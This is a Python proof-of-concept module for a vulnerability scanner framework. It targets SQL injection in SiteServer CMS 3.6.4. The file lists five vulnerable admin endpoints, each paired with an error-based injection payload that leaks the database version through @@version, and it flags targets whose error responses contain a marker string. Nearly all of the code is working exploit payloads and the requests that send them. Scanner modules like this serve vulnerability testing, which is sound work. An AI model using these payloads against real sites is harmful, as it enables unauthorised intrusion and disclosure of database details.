# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'SiteServer_0007'  # 平台漏洞编号，留空
    name = 'SiteServer最新版3.6.4 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-02-03'  # 漏洞公布时间
    desc = '''
        SiteServer CMS是定位于中高端市场的CMS内容管理系统，能够以最低的成本、最少的人力投入在最短的时间内架设一个功能齐全、性能优异、规模庞大并易于维护的网站平台。
        SiteServer最新版3.6.4 多处存在SQL注入漏洞：
        /siteserver/cms/background_contentsGroup.aspx
        /siteserver/cms/modal_contentTagAdd.aspx
        /siteserver/UserRole/background_userAdd.aspx
        /siteserver/cms/modal_contentGroupAdd.aspx
        /siteserver/UserRole/modal_UserView.aspx
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'SiteServer'  # 漏洞应用名称
    product_version = '3.6.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '236fecd4-14a0-428a-af08-4cfcb9de906c'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            ps = [
                '/siteserver/cms/background_contentsGroup.aspx?publishmentSystemID=1&contentGroupName=test%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version%20and%201=%271',
                '/siteserver/cms/modal_contentTagAdd.aspx?PublishmentSystemID=2109&TagName=1%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version%20and%201=%271',
                '/siteserver/UserRole/background_userAdd.aspx?UserName=yjfjnpuc%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version%20and%201=%271&ReturnUrl=../cms/console_user.aspx',
                '/siteserver/cms/modal_contentGroupAdd.aspx?PublishmentSystemID=2222&GroupName=123%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version%20and%201=%271',
                '/siteserver/UserRole/modal_UserView.aspx?Username=d%27%20or[areaid]>char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--'
            ]
            for p in ps:
                url = arg+p
                code, head, res, errcode, _ = hh.http(url)

                if code == 500 and "GAOJIMicrosoft" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
